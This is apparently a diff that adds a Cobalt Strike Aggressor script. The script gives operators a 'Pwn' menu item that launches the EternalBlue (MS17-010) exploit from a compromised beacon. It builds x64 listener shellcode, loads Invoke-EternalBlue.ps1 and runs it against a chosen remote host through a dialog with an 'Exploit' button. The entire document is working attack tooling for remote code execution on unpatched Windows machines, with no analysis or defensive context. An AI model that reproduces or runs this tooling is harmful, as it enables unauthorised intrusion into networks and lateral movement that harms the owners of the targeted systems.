@@ -1,0 +1,30 @@
+#define functions
+
+
+
+sub ms17_010 {
+	$stager = transform(shellcode($3['listener'], false,"x64"),"array");
+	bpowershell_import!($bid, script_resource("script/Invoke-EternalBlue.ps1"));
+	bpowerpick($bid, "Invoke-EternalBlue -Target $3['Rhost'] $+  -Shellcode @($stager $+ ) -InitialGrooms $3['InitialGrooms'] $+  -MaxAttempts $3['MaxAttempts']");
+}
+
+
+
+
+
+#append menu
+
+
+    menu "Pwn"{
+        item "EternalBlue"{
+            $bid = $1['@'];
+            $Dialog = dialog("EternalBlue",%(Rhost => beacon_info($bid,"internal"), InitialGrooms => "12", MaxAttempts => "1", bid => $bid),&ms17_010);
+            dialog_description($Dialog, "EternalBlue Attack Target in Power Shell");
+            drow_text($Dialog, "Rhost",  "Rhost:");
+            drow_listener($Dialog, "listener", "Listener: ");
+            drow_text($Dialog, "InitialGrooms",  "InitialGrooms:");
+            drow_text($Dialog, "MaxAttempts",  "MaxAttempts:");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
+    }
